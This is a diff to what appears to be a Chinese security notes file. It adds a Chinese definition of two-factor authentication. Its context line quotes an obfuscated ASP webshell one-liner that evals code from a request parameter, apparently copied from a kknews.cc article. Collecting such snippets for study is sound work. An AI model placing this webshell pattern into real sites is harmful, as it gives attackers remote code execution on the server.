@@ -133,3 +133,7 @@ requestms.ExecuteStatement(“ev”&”al(request(“”1″”))”)%>
 
 原文網址：https://kknews.cc/tech/yvorxbn.html
 ```
+# 雙因素認證（two-factor authentication）
+```
+雙重認證（英語：Two-factor authentication，縮寫為2FA），又譯為雙重驗證、雙因子認證、雙因素認證、二元認證，又稱兩步驟驗證（2-Step Verification，又譯兩步驗證），是多重要素驗證中的一個特例，使用兩種不同的元素，合併在一起，來確認使用者的身分
+```
